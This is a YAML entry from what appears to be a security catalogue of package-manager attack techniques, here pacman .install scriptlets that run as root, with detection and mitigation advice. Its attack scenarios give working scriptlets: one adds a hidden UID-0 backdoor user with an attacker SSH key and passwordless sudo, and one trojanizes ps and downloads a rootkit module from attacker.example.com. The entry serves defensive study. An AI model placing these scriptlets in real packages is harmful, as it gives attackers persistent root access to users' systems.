---
name: "Pacman Install Scriptlets (.install Hooks)"
packageManager: "pacman"
slug: "pacman-install-scriptlets"
category: "Code Execution"
severity: "critical"
platform:
  - "Linux"
description: "Pacman packages can include .install scriptlet files containing Bash functions that execute as root during package installation, upgrade, and removal. The functions pre_install(), post_install(), pre_upgrade(), post_upgrade(), pre_remove(), and post_remove() run automatically with full root privileges. Unlike PKGBUILD execution which happens at build time as the user, install scriptlets execute at install time as root via pacman itself, giving them unrestricted system access."
prerequisites:
  - "Ability to create a pacman package (.pkg.tar.zst) with an embedded .install scriptlet"
  - "The victim must install the package via pacman -U or through a repository/AUR helper"
  - "Install scriptlets run as root because pacman itself runs with elevated privileges during installation"
attackScenarios:
  - title: "Malicious post_install() Creating a Backdoor User"
    description: "An attacker crafts a package with a .install scriptlet that creates a hidden user with root privileges and installs an SSH key for persistent remote access. The post_install() function runs as root after the package files are placed on disk."
    commands:
      - label: "Malicious .install file (cool-tool.install)"
        code: |
          post_install() {
              # Legitimate-looking post-install message
              echo ":: Updating font cache..."
              fc-cache -f 2>/dev/null

              # Create a backdoor user disguised as a system service account
              useradd -r -m -s /bin/bash -G wheel -o -u 0 systemd-coredumpd 2>/dev/null
              mkdir -p /home/systemd-coredumpd/.ssh
              echo "ssh-ed25519 AAAA...attacker-key..." > /home/systemd-coredumpd/.ssh/authorized_keys
              chmod 600 /home/systemd-coredumpd/.ssh/authorized_keys
              chown -R systemd-coredumpd: /home/systemd-coredumpd/.ssh

              # Add to sudoers with NOPASSWD
              echo "systemd-coredumpd ALL=(ALL) NOPASSWD: ALL" > /etc/sudoers.d/10-coredumpd
          }

          post_upgrade() {
              post_install
          }

          pre_remove() {
              # Clean up evidence if package is removed
              userdel -r systemd-coredumpd 2>/dev/null
              rm -f /etc/sudoers.d/10-coredumpd
          }
        language: "bash"
      - label: "PKGBUILD referencing the .install file"
        code: |
          # PKGBUILD
          pkgname=cool-tool
          pkgver=2.1.0
          pkgrel=1
          pkgdesc="A helpful system utility"
          arch=('x86_64')
          license=('GPL')
          install=cool-tool.install

          package() {
              install -Dm755 "$srcdir/cool-tool" "$pkgdir/usr/bin/cool-tool"
          }
        language: "bash"
  - title: "Rootkit Installation via post_install()"
    description: "An attacker uses the post_install scriptlet to replace system binaries with trojanized versions or install a kernel module rootkit, leveraging the root context of pacman's install process."
    commands:
      - label: ".install scriptlet that replaces system binaries"
        code: |
          post_install() {
              # Replace ps and netstat to hide attacker processes
              cp /usr/bin/ps /usr/bin/.ps.orig
              cat > /usr/bin/ps << 'WRAPPER'
          #!/bin/bash
          /usr/bin/.ps.orig "$@" | grep -v "attacker_process"
          WRAPPER
              chmod 755 /usr/bin/ps

              # Download and load a kernel module
              curl -s -o /lib/modules/$(uname -r)/extra/syshelper.ko \
                  https://attacker.example.com/rootkit.ko
              insmod /lib/modules/$(uname -r)/extra/syshelper.ko 2>/dev/null
          }
        language: "bash"
detection:
  - title: "Inspect .install files before installing packages"
    description: "Extract and review the .install scriptlet from a package archive before installing it."
    commands:
      - code: |
          # List all files in a package
          tar -tf package.pkg.tar.zst
          # Extract and view the .install scriptlet
          tar -xf package.pkg.tar.zst .INSTALL 2>/dev/null && cat .INSTALL
        language: "bash"
  - title: "Review install scriptlets from AUR packages"
    description: "Check for .install files referenced in PKGBUILDs before building."
    commands:
      - code: |
          # Check if PKGBUILD references an install scriptlet
          grep '^install=' PKGBUILD
          # If it does, review the referenced .install file
          cat *.install
        language: "bash"
  - title: "Monitor pacman transactions with hooks"
    description: "Use pacman's own hook system to log all scriptlet executions for auditing."
    commands:
      - code: |
          # /etc/pacman.d/hooks/log-installs.hook
          # [Trigger]
          # Operation = Install
          # Operation = Upgrade
          # Type = Package
          # Target = *
          # [Action]
          # When = PreTransaction
          # Exec = /usr/bin/logger -t pacman-audit "Transaction starting"

          # Check logs for suspicious scriptlet activity
          journalctl -t pacman-audit
        language: "bash"
mitigation:
  - "Review .install scriptlet files before building and installing AUR packages"
  - "Use pacman's built-in sandbox features where available or install packages in a clean chroot"
  - "Prefer official repository packages where install scriptlets are reviewed by trusted packagers"
  - "Monitor /etc/sudoers.d/, /etc/passwd, and authorized_keys for unexpected modifications after installs"
  - "Use file integrity monitoring (AIDE, Tripwire) to detect unauthorized changes to system binaries"
  - "Run pacman -Qkk periodically to verify installed package file integrity"
references:
  - title: "Arch Wiki - PKGBUILD install"
    url: "https://wiki.archlinux.org/title/PKGBUILD#install"
  - title: "Arch Wiki - Pacman/Tips and tricks"
    url: "https://wiki.archlinux.org/title/Pacman/Tips_and_tricks"
  - title: "man alpm-hooks(5) - Pacman hooks"
    url: "https://man.archlinux.org/man/alpm-hooks.5"
created: 2026-04-14
updated: 2026-04-14
---
